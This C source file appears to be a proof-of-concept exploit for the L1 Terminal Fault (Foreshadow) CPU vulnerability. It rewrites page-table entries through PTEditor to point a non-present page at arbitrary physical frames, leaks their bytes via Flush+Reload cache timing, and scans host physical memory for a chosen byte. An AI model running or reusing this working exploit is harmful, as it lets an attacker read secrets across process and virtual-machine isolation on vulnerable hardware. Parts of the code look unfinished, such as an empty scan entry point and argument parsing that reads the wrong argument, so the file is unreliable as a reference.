#define _GNU_SOURCE
#include "l1tf.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "statistics.h"
#include <bits/types/siginfo_t.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

#define THRESHOLD 150

uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
  uint8_t result = 0;
  for (size_t nibble = 0; nibble < AMOUNT_OF_NIBBLES_PER_RELOAD; ++nibble) {
    size_t *partial_results =
        &raw_results[nibble * AMOUNT_OF_OPTIONS_IN_NIBBLE];
    size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE, partial_results);
    result |= max << (4 * nibble);
  }
  return result;
}

uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};

  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
  asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
  reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
         THRESHOLD);

  return reconstruct_nibbles(raw_results);
}

// Super fast checking of the existance of a byte at a certain address.
// Only requires a single FLUSH+RELOAD of a single address (instead
// of 32 or 256). Useful to quickly scan physical memory, assuming we know
// that a certain byte appears.
bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
                uint8_t check) {
  clflush(reload_buffer[check]);
  // clflush((void *)segfault_handler_full);
  mfence();

  asm_l1tf_leak_full(leak_addr, reload_buffer);

  size_t time = access_time(reload_buffer[check]);
  return time < THRESHOLD;
}

// Returns a pointer to the physical address where the needle was found.
void *l1tf_scan_physical_memory(size_t length, char needle[length],
                                size_t stride) {
  assert(length > 0);

  leak_addr_t leak = l1tf_leak_buffer_create();

  // First, scan quickly
  full_reload_buffer_t reload_buffer;
  for (uintptr_t ptr = 0; ptr < HOST_MEMORY_SIZE; ptr += stride) {
    if (ptr % 0x100000 == 0) {
      fprintf(stderr, "%ld MB\r", ptr / stride);
    }
    l1tf_leak_buffer_modify(&leak, (void *)ptr);
    if (l1tf_check(leak.leak, reload_buffer, needle[0])) {
      printf("%lx\n", ptr);
    }
  }

  l1tf_leak_buffer_free(&leak);
  return 0;
}

leak_addr_t l1tf_leak_buffer_create() {
  void *leak_ptr = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak_ptr != MAP_FAILED);
  assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));

  leak_addr_t leak;
  leak.leak = leak_ptr;

  ptedit_entry_t entry = ptedit_resolve(leak.leak, 0);
  leak.pte_ptr = entry.pte_ptr;
  leak.original_pfn = ptedit_get_pfn(*leak.pte_ptr);

  *leak.pte_ptr &= ~(1ull << PTEDIT_PAGE_BIT_PRESENT);
  ptedit_invalidate_tlb(leak.leak);

  return leak;
}

void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
  size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
  // ptedit_pte_set_pfn(leak->leak, 0, pfn);
  size_t current_pte = *(leak->pte_ptr);
  *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
}

void l1tf_leak_buffer_free(leak_addr_t *leak) {
  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak->leak, 0, leak->original_pfn);
  assert(!munmap(leak->leak, PAGE_SIZE));
}

void initialize_pteditor_lib() {
  fprintf(stderr, "Initializing PTEdit...\r");
  assert(!ptedit_init());
  fprintf(stderr,
          "Initialized PTEdit! Mapping physical memory to user space...\n");
  ptedit_use_implementation(PTEDIT_IMPL_USER);
}

int main_leak(int argc, char *argv[argc]) {
  initialize_pteditor_lib();

  char *tail = NULL;
  uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
  assert(tail != argv[1]);

  tail = NULL;
  size_t length = strtoull(argv[2], &tail, 10);
  assert(tail != argv[2]);

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
          (void *)phys_addr);

  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer =
      mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);

  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = length * sizeof(uint8_t);
  uint8_t *results = malloc(results_size);
  memset(results, 0, results_size);

  printf("Results physcial addr %lx:\n", phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  while (1) {
    for (size_t j = start; j < start + length; j += 1) {
      void *leak_addr = (char *)leak.leak + j;
      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);

      if (leaked_byte != 0) {
        results[j - start] = leaked_byte;
      }
    }

    for (size_t i = 0; i < length; ++i) {
      printf("%02x ", results[i]);
    }
    printf("\r");
  }

  free(results);

  l1tf_leak_buffer_free(&leak);

  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
  ptedit_cleanup();
}

int main_scan(int argc, char *argv[argc]) {}

int main(int argc, char *argv[argc]) {
  assert(argc > 0);

  if (argc >= 2) {
    if (!strncmp("leak", argv[1], 5)) {
      return main_leak(argc, argv);
    } else if (!strncmp("scan", argv[1], 5)) {
      return main_scan(argc, argv);
    }
  }
  fprintf(stderr,
          "Usage\n"
          "\t%s leak\n"
          "\t%s scan\n",
          argv[0], argv[0]);
  exit(1);
}
